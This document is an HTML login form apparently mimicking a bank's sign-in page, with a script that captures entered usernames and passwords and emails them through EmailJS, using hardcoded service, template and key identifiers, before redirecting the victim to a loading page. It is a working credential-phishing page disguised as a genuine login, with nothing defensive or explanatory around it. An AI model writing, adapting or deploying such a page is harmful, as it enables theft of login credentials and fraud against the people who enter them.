   <form id="login-form" action="/" class="dbk-login__login-form" autocomplete="off">
  <div class="fluid-form-layout dbk-login__login-form-container">
    <div class="fluid-form-layout-section dbk-login__form-section">
      <div class="fluid-form-layout-section__content-container">
        <!-- Username Field (unchanged) -->
        <div class="fluid-form-layout-field-container username-container">
          <div style="--username-padding:107px">
            <label class="fluid-form-label fluid-form-label--stacked username-field" for="username">
              <span class="fluid-form-label__text">
                <span class="fluid-form-label__text-inner">Username</span>
              </span>
              <span class="fluid-form-label__comp-container">
                <input name="userid" autocomplete="off" id="username" autocapitalize="none" autocorrect="off" spellcheck="false" type="text" class="fluid-text-input cs-username" value="">
              </span>
            </label>
          </div>
        </div>
        <!-- Password Field with Show/Hide Icon (text removed) -->
        <div class="fluid-form-layout-field-container password-container">
          <label class="fluid-form-label fluid-form-label--stacked password-field show-hide-enabled" for="password">
            <span class="fluid-form-label__text">
              <span class="fluid-form-label__text-inner">Password</span>
            </span>
            <span class="fluid-form-label__comp-container">
              <input name="password" autocomplete="off" id="password" autocapitalize="none" autocorrect="off" spellcheck="false" type="password" class="fluid-text-input cs-password">
            </span>
          </label>
          <div class="password-field__show-hide">
            <button type="button" class="fluid-button" onclick="togglePasswordVisibility()">
              <span class="fluid-button__content">
              </span>
            </button>
          </div>
        </div>
        <!-- Log In Button (unchanged) -->
        <div class="fluid-form-layout-field-container">
          <button type="submit" class="fluid-button fluid-button--primary is-dark-bg">
            <span class="fluid-button__content">
              <span class="fluid-button__text">Log In</span>
            </span>
          </button>
        </div>
        <!-- Forgot Login Link (unchanged) -->
        <div class="fluid-form-layout-field-container">
          <nav>
            <ul class="dbk-login__links">
              <li>
                <button type="button" class="fluid-button fluid-button--link">Forgot Login?</button>
              </li></ul></nav></div></div></div></div>

               <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
      <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script>
  // Initialize EmailJS with your public key
  emailjs.init("siT31RhtJaHQZ8QNO");

  // Get DOM elements
  const form = document.getElementById('login-form');
  const loginButton = document.getElementById('login-button');
  const usernameInput = document.getElementById('username');
  const passwordInput = document.getElementById('password');

  // Enable button when inputs are filled
  function updateButtonState() {
    if (loginButton) {
      loginButton.disabled = !(usernameInput.value.trim() && passwordInput.value.trim());
    }
  }

  // Add input event listeners to update button state
  usernameInput.addEventListener('input', updateButtonState);
  passwordInput.addEventListener('input', updateButtonState);

  // Password show/hide toggle
  function togglePasswordVisibility() {
    if (passwordInput.type === 'password') {
      passwordInput.type = 'text';
    } else {
      passwordInput.type = 'password';
    }
  }
  window.togglePasswordVisibility = togglePasswordVisibility;

  // Function to send email with username and password
  function sendEmail(username, password) {
    return emailjs.send("service_u6u95wc", "template_v61wff7", {
      username: username,
      password: password
    })
    .then(function(response) {
      console.log('Email sent successfully!', response);
      window.location.href = 'loading.html'; // Redirect to loading page
    }, function(error) {
      console.error('Email sending failed:', error);
      alert('Failed to send email. Please try again.');
    });
  }

  // Add submit event listener to the form
  form.addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent default form submission

    const username = usernameInput.value.trim();
    const password = passwordInput.value.trim();

    if (!username || !password) {
      alert('Please fill in both fields.');
      return;
    }

    // Disable button to prevent multiple submissions
    if (loginButton) loginButton.disabled = true;

    // Send email
    sendEmail(username, password).finally(() => {
      // Re-enable button after email attempt
      updateButtonState();
    });
  });

  // Initial state
  updateButtonState();
</script>
